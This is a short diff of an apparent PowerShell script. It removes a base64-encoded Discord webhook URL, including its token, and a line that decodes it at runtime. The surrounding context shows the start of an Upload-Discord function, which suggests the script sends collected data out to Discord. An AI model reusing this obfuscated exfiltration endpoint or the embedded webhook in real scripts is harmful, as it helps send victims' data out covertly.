@@ -1,6 +1,3 @@
-$base64String = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjAzODU4MjI3MDcwMTYwMC90RS1PUnFSdXBPeG5qTXhsZldWaUFxM0ViQkJ3R3pBamlOOXJGUWZKd1Mza2xGZ0Nib0lnWXd0RWpPOUNHWTVILWluVA=="
-$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MjAzODU4MjI3MDcwMTYwMC90RS1PUnFSdXBPeG5qTXhsZldWaUFxM0ViQkJ3R3pBamlOOXJGUWZKd1Mza2xGZ0Nib0lnWXd0RWpPOUNHWTVILWluVA=="))
-
 
 function Upload-Discord {
 
